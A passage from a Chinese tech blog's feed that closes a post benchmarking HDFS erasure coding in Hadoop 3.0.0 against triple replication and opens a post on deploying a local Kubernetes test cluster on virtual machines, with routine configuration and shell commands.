plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">property</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">configuration</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>将环境变量增加到当前用户bashrc：</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># ~/.bashrc</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">HADOOP_HOME</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/opt/hadoop</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">export</span><span class="token plain"> </span><span class="token assign-left variable environment constant" style="color:#36acaa">PATH</span><span class="token operator" style="color:#393A34">=</span><span class="token environment constant" style="color:#36acaa">$PATH</span><span class="token plain">:/opt/hadoop/bin</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>配置修改完成后将/opt/hadoop整个目录同步到所有datanode节点。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="启动hdfs">启动HDFS<a class="hash-link" href="#启动hdfs" title="标题的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="格式化namenode">格式化namenode<a class="hash-link" href="#格式化namenode" title="标题的直接链接">​</a></h3><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">hdfs namenode -format ns1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="启动namenode和datanode">启动namenode和datanode<a class="hash-link" href="#启动namenode和datanode" title="标题的直接链接">​</a></h3><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 注意3.0.0版本的差别，在2.7中启动脚本如下</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hadoop-daemon.sh --config </span><span class="token variable" style="color:#36acaa">$HADOOP_HOME</span><span class="token plain">/etc/hadoop --script hdfs start namenode</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hadoop-daemon.sh --config </span><span class="token variable" style="color:#36acaa">$HADOOP_HOME</span><span class="token plain">/etc/hadoop --script hdfs start datanode</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 新版本中已经重写了管理脚本，统一到hdfs命令中，启动方式如下：</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hdfs --daemon start namenode</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hdfs --daemon start datanode</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>启动成功之后即可通过<a href="http://192.168.199.26:9870/dfshealth.html#tab-datanode" target="_blank" rel="noopener noreferrer">namenode web ui</a>观察到集群基本情况，2.7中默认web ui端口为50070，而3.0.0中修改为9870，</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="测试hdfs">测试hdfs<a class="hash-link" href="#测试hdfs" title="标题的直接链接">​</a></h2><p>启动完成之后可以通过hdfs命令测试服务是否可用：</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">hdfs dfs -mkdir hdfs://192.168.199.26:8020/t1/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">dd</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">if</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/dev/urandom </span><span class="token assign-left variable" style="color:#36acaa">of</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">f1 </span><span class="token assign-left variable" style="color:#36acaa">bs</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">1M </span><span class="token assign-left variable" style="color:#36acaa">count</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">5000</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hdfs dfs -put f1 hdfs://192.168.199.26:8020/t1/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hdfs dfs -rm -skipTrash hdfs://192.168.199.26:8020/t1/f1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>这里使用的时候需要写完整的hdfs协议和namenode:port，我们可以修改一下配置文件，将defaultfs修改为hdfs协议，方便测试。同时此版本中默认并未启用纠删码，需要手工配置。
默认内置支持的policy有 RS-3-2-64k, RS-6-3-64k, RS-10-4-64k, RS-LEGACY-6-3-64k, XOR-2-1-64k，我这里只准备了少量节点，因此只对其中两种进行简单测试。</p><p>修改<code>hdfs-site.xml</code> 增加以下配置：</p><div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">property</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">dfs.namenode.ec.policies.enabled</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">value</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">XOR-2-1-64k,RS-3-2-64k</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">value</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">property</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">property</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">dfs.nameservices</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">value</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">ns1</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">value</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">property</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">property</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">dfs.ha.namenodes.ns1</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">value</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">nn1</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">value</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">property</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">property</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">dfs.namenode.rpc-address.ns1.nn1</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">value</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">192.168.199.26:8020</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">value</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">property</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">property</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">dfs.client.failover.proxy.provider.ns1</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">value</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">org.apache.hadoop.hdfs.server.namenode.ha.ConfiguredFailoverProxyProvider</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">value</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">property</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>修改<code>core-site.xml</code>增加以下配置：</p><div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">configuration</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">property</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">fs.defaultFS</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">value</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">hdfs://ns1</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">value</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">final</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">true</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">final</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">property</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">configuration</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>重启namenode节点后，就可以使用纠删码了，纠删码可以针对目录进行设置，不同的目录设置不同的策略。</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">hdfs ec -setPolicy -policy XOR-2-1-64k -path /t1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hdfs ec -setPolicy -policy RS-3-2-64k -path /t2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>我们准备了3个目录，t1和t2分别设置了不同的policy，t3不设置，往3个目录上传相同的5G大小的文件，每次上传前均清空hdfs中数据，并清空虚拟机和物理机缓存，统计的耗时和空间占用情况大致如下：</p><table><thead><tr><th>HDFS目录</th><th>纠删码策略</th><th>put耗时</th><th>磁盘占用kb</th></tr></thead><tbody><tr><td>t1</td><td>XOR-2-1-64k</td><td>1m15.559s</td><td>7740364</td></tr><tr><td>t2</td><td>RS-3-2-64k</td><td>1m13.920s</td><td>8600436</td></tr><tr><td>t3</td><td>无(三副本)</td><td>2m7.705s</td><td>15480600</td></tr></tbody></table><p>通过简单的测试对比，我们可以大致了解到在理想状态下纠删码技术比传统的三副本在写入速度上有提升，因其降低了对磁盘IO和带宽的消耗，同时占用的磁盘空间小于三副本方式。其中磁盘占用和不同的纠删码策略理论值基本吻合， 磁盘空间消耗倍数为 <code>(校验块+数据块)/数据块</code>。</p><p>注意这里的测试仅限于对HADOOP3.0.0中纠删码有一个感性认识，测试方法有很多不严谨的地方，比如put数据的耗时并未考虑各种环境因素，仅仅是在一个相对理想的环境下进行简单测试。实际生产环境中情况非常复杂，需要权衡CPU带宽磁盘，甚至机架供电等各方面因素，如果需要获得一份可靠的性能对比数据则必须保障稳定运行足够长的时间，通过长期观察才能得出对生产有实际指导意义的信息。</p><p>参考文档：</p><p>[1]<!-- --> <a href="http://hadoop.apache.org/docs/r3.0.0-alpha4/hadoop-project-dist/hadoop-common/ClusterSetup.html" target="_blank" rel="noopener noreferrer">http://hadoop.apache.org/docs/r3.0.0-alpha4/hadoop-project-dist/hadoop-common/ClusterSetup.html</a></p><p>[2]<!-- --> <a href="http://hadoop.apache.org/docs/current/hadoop-project-dist/hadoop-hdfs/HDFSErasureCoding.html" target="_blank" rel="noopener noreferrer">http://hadoop.apache.org/docs/current/hadoop-project-dist/hadoop-hdfs/HDFSErasureCoding.html</a></p>]]></content>
        <category label="hadoop" term="hadoop"/>
        <category label="bigdata" term="bigdata"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[k8s测试环境部署记录]]></title>
        <id>/2017/08/18/deploy-k8s-from-local-repo</id>
        <link href="https://itxx00.github.io/notes/blog/2017/08/18/deploy-k8s-from-local-repo"/>
        <updated>2017-08-18T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[记录k8s在本地测试环境的部署过程]]></summary>
        <content type="html"><![CDATA[<blockquote><p>本文记录了在本地部署k8s测试环境的过程，部署脚本参考github上其他同学分享的脚本，在其基础上做了些小改动。</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="k8s-中的节点类型">k8s 中的节点类型<a class="hash-link" href="#k8s-中的节点类型" title="标题的直接链接">​</a></h2><p>master 负责管理其他节点的调度中心，master可以有备机replica做冗余</p><p>minion 由master管理，运行容器服务，1个集群中有N个minion节点</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="部署前准备">部署前准备<a class="hash-link" href="#部署前准备" title="标题的直接链接">​</a></h2><p>部署此测试环境参考了github上其他同学的分享，我fork的repo地址：<a href="https://github.com/5xops/k8s-deploy" target="_blank" rel="noopener noreferrer">https://github.com/5xops/k8s-deploy</a></p><p>首先按照github repo中的readme部分将k8s rpm包下载到本地，以准备离线部署。其次我在本地测试环境准备了6以上的虚拟机节点，其中3个节点用于部署etcd集群，2个节点用于部署k8s master，其余节点用于部署k8s minion。
所有虚拟机均运行在一台物理服务器上，管理虚拟机用了这个脚本（<a href="https://github.com/itxx00/vmm%EF%BC%89%E3%80%82" target="_blank" rel="noopener noreferrer">https://github.com/itxx00/vmm）。</a></p><p>首先创建好需要使用到的虚拟机节点：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">vmm create etcd1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vmm create etcd2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vmm create etcd3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vmm create kubem1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vmm create kubem2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vmm create node1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vmm create node2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>因部署k8s集群时要求所有节点都配置好主机名，因为默认创建出来的虚拟机没有修改hostname，需要使用另外一个脚本来配置hostname并配置好/etc/hosts，首先准备好初始化执行的脚本：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#!/bin/bash</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># content of ~/.vmm/init.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cd /tmp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hostnm=$(cat hostname)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[[ -n $hostnm ]] || {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    echo "err"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    exit 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo $hostnm &gt;/etc/hostname</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hostname $hostnm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cat /tmp/hosts.tmp &gt;/etc/hosts</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>接着执行初始化操作：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">vminit etcd1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vminit etcd2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vminit etcd3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vminit kubem1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vminit kubem2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vminit node1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vminit node2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path 